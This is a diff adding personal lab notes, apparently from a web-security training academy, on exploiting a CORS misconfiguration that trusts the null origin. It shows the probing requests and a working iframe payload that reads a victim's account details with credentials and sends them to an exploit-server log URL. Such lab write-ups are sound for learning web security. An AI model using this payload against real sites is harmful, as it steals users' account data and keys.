@@ -97,4 +97,32 @@ location='https://exploit-0a08004b030795948125611b01c30041.exploit-server.net/lo
 // even after delivering the payload and logging
 // in as admin...
 
+===
+
+CORS vulnerability with trusted null origin
+
+// get request response returns header indicating CORS vuln
+request:
+GET /accountDetails HTTP/2
+response contains:
+Access-Control-Allow-Credentials: true
+
+// note that if we set an Origin header to null,
+// it is reflected in the response corresponding header:
+request:
+Origin: null
+response:
+Access-Control-Allow-Origin: null
+
+// exploit template on attacker infra:
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
+  var req = new XMLHttpRequest();
+  req.onload = reqListener;
+  req.open('get','https://0a14000d04f4108d80dc211a00ab00d1.web-security-academy.net/accountDetails',true);
+  req.withCredentials = true;
+  req.send();
+  function reqListener() {
+    location='https://exploit-0a04009a042b102e808e20f601010042.exploit-server.net/log?key='+encodeURIComponent(this.responseText);
+  };
+</script>"></iframe>
 
